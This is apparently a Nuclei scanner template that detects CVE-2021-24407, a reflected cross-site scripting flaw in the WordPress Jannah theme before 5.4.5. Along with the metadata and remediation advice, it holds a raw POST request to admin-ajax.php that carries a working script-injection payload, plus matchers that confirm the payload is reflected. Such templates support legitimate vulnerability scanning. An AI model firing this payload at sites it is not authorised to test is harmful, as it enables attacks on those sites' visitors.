id: CVE-2021-24407

info:
  name: WordPress Jannah Theme <5.4.5 - Cross-Site Scripting
  author: pikpikcu
  severity: medium
  description: WordPress Jannah theme before 5.4.5 contains a reflected cross-site scripting vulnerability. It does not properly sanitize the 'query' POST parameter in its tie_ajax_search AJAX action.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to inject malicious scripts into web pages viewed by users, leading to potential data theft, session hijacking, or defacement of the affected website.
  remediation: |
    Update the Jannah Theme to version 5.4.5 or later, which includes proper input sanitization to mitigate the XSS vulnerability.
  reference:
    - https://wpscan.com/vulnerability/fba9f010-1202-4eea-a6f5-78865c084153
    - https://nvd.nist.gov/vuln/detail/CVE-2021-24407
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2021-24407
    cwe-id: CWE-79
    epss-score: 0.00161
    epss-percentile: 0.52574
    cpe: cpe:2.3:a:tielabs:jannah:*:*:*:*:*:wordpress:*:*
  metadata:
    max-request: 1
    vendor: tielabs
    product: jannah
    framework: wordpress
  tags: cve2021,cve,wordpress,xss,wp-theme,wpscan,tielabs

http:
  - raw:
      - |
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
        Content-Type: application/x-www-form-urlencoded

        action=tie_ajax_search&query[]=</script><script>alert(document.domain)</script>

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '</script><script>alert(document.domain)</script>'

      - type: word
        part: header
        words:
          - text/html

      - type: status
        status:
          - 200
# digest: 490a0046304402205219bdd2dc210b7639e187ed6e4f7f535a05502e00761de727e8cf0bc628ec0d022077895231ddffcfc6677bf83d0177b702dbc356b2f3c4e2d83a8c7e9f128c1669:922c64590222798bb761d5b6d8e72950